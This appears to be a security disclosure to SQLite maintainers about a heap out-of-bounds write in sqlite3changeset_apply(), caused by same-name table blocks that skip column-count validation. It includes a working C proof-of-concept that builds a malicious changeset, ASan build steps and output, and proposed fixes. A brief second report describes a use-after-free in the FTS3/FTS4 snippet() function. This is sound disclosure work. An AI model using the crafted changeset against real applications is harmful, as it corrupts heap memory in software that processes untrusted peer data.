I want to report a malformed changeset issue in sqlite3changeset_apply(). The
higher-impact issue is a confirmed attacker-triggered heap out-of-bounds write,
not only an out-of-bounds read or denial-of-service crash. Because a changeset
received from a malicious synchronization peer can corrupt heap memory through
one ordinary public-API call, I believe this warrants a priority
handling.


The issue affects applications built with SQLITE_ENABLE_SESSION that pass
changesets from an untrusted source to sqlite3changeset_apply() or the related
apply APIs. Builds without the session extension are not exposed. Changesets
are commonly used as a synchronization or wire format between peers, so a
malicious peer is a realistic source of the crafted bytes.

I reproduced the write against:
SQLite version:   3.54.0
SQLITE_SOURCE_ID: 2026-07-31 22:45:45 bf44a08adc94b8c7c69921a1292d56bec0cbd9f3ac772e31d8ea5866e9f46063


Root cause: sessionChangesetApply() validates a changeset table block's declared column
count and initializes SessionApplyCtx only when the table name changes:

if( zTab==0 || sqlite3_strnicmp(zNew, zTab, nTab+1) ){
...
if( sApply.nCol<nCol ){
schemaMismatch = 1;
}
...
}

Two consecutive table blocks can therefore use the same table name but declare
different column counts. The second block bypasses the validation and reuses
cached state allocated for the first block.

For UPDATE operations, sessionUpdateFind() computes the required mask size
from the current, attacker-controlled column count, but allocates aUpdateMask
only if it is NULL:

int nU32 = (pIter->nCol+33)/32;

if( p->aUpdateMask==0 ){
p->aUpdateMask = sqlite3_malloc(nU32*sizeof(u32));
}

memset(p->aUpdateMask, 0, nU32*sizeof(u32));
...
p->aUpdateMask[ii/32] |= (1<<(ii%32));

The first block in the reproducer below declares 2 columns, so aUpdateMask is
allocated for nU32 == 1. The second block uses the same table name but declares
64 columns. The name comparison treats it as the same table, the column-count
check is skipped, and sessionUpdateFind() recomputes nU32 == 3 without resizing
the existing allocation. The memset() therefore performs a 12-byte write
through the smaller allocation. The later bit-setting loop can also write past
that allocation.


To reproduce the direct OOB-write: save the following as repro.c in a directory containing sqlite3.c and
sqlite3.h:

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sqlite3.h"

static int conflict_cb(void *ctx, int conflict, sqlite3_changeset_iter *iter){
(void)ctx;
(void)conflict;
(void)iter;
return SQLITE_CHANGESET_OMIT;
}

static unsigned char *put_int(unsigned char *p, sqlite3_int64 value){
uint64_t v = (uint64_t)value;
int i;
*p++ = SQLITE_INTEGER;
for(i=7; i>=0; i--) *p++ = (unsigned char)(v >> (i*8));
return p;
}

static unsigned char *put_text(unsigned char *p, const char *value){
size_t n = strlen(value);
*p++ = SQLITE_TEXT;
*p++ = (unsigned char)n;
memcpy(p, value, n);
return p+n;
}

int main(void){
unsigned char changeset[1024];
unsigned char *p = changeset;
sqlite3 *db = 0;
int i;
int rc;

*p++ = 'T';
*p++ = 2;
*p++ = 1;
*p++ = 0;
*p++ = 't';
*p++ = 0;
*p++ = SQLITE_UPDATE;
*p++ = 0;
p = put_int(p, 1);
p = put_text(p, "old");
*p++ = 0;
p = put_text(p, "new");

*p++ = 'T';
*p++ = 64;
for(i=0; i<64; i++) *p++ = (i==0);
*p++ = 't';
*p++ = 0;
*p++ = SQLITE_UPDATE;
*p++ = 0;
p = put_int(p, 1);
for(i=1; i<64; i++) *p++ = 0;
for(i=0; i<63; i++) *p++ = 0;
p = put_int(p, 2);

rc = sqlite3_open(":memory:", &db);
if( rc!=SQLITE_OK ) return 1;
rc = sqlite3_exec(db,
"CREATE TABLE t(id INTEGER PRIMARY KEY, v TEXT);"
"INSERT INTO t VALUES(1, 'old');", 0, 0, 0);
if( rc!=SQLITE_OK ) return 1;

rc = sqlite3changeset_apply(
db, (int)(p-changeset), changeset, 0, conflict_cb, 0
);
printf("sqlite3changeset_apply returned %d\n", rc);
sqlite3_close(db);
return 0;
}



Build and run it with AddressSanitizer:

cc -O1 -g -fsanitize=address -fno-omit-frame-pointer -I. \
-DSQLITE_ENABLE_SESSION -DSQLITE_ENABLE_PREUPDATE_HOOK \
-o repro-asan repro.c sqlite3.c -lm -lpthread -ldl

ASAN_OPTIONS=abort_on_error=1:detect_leaks=0 ./repro-asan


On the version above, AddressSanitizer reports:

ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 12


The write resolves to the memset() in sessionUpdateFind() at sqlite3.c:238090
in this snapshot. The relevant call path is:

sqlite3changeset_apply
-> sessionChangesetApplyV23
-> sessionChangesetApply
-> sessionApplyOneWithRetry
-> sessionApplyOneOp
-> sessionUpdateFind
-> memset(p->aUpdateMask, 0, nU32*sizeof(u32))


The confirmed impact is a heap out-of-bounds write caused by an
attacker-controlled changeset. The attacker controls the declared column count
and which update fields are present. The first overwrite shown here is the
zeroing performed by memset(); the following mask loop writes bit values. This
is not an arbitrary-address or fully arbitrary-value write, and I have not
demonstrated control-flow hijacking. It is nevertheless direct heap corruption
in a library process and is higher impact than the separately reproducible
out-of-bounds-read crash caused by the same validation bypass.


The root fix is to stop treating the table name alone as the identity of the
validated apply state. Each table block should have its declared column count
and primary-key layout validated before any operation is applied. If a
same-name block changes either value, SQLite should reject it or fully discard
and rebuild all cached SessionApplyCtx state before processing it.

As defense in depth, sessionUpdateFind() should track the allocated capacity of
aUpdateMask and resize or reject it before memset() and the mask-building loop.
The mask expression should also use an unsigned constant, 1u<<(ii%32), to avoid
the existing signed-shift undefined behavior at bit 31.

I want to report a use-after-free vulnerability in FTS3/FTS4 snippet().

fts3BestSnippet iterates the phrases via sqlite3Fts3ExprIterate(…, 
fts3SnippetFindPositions, …) and caches each phrase's poslist pointer in
SnippetIter.aPhrase[i].pHead/pTail. For a later phrase,
sqlite3Fts3EvalPhrasePoslist hits the if( pPhrase->bIncr ) branch
(ext/fts3/fts3.c:6091) and calls fts3EvalRestart(pCsr, pRun, &rc), which
reloads - i.e. frees and reallocates - the doclist buffer of every phrase in
the pRun subtree. The pointers cached for the earlier phrases now dangle, and
fts3SnippetNextCandidate → fts3SnippetAdvance dereferences them after the
iteration finishes. Affects fts3 and fts4.

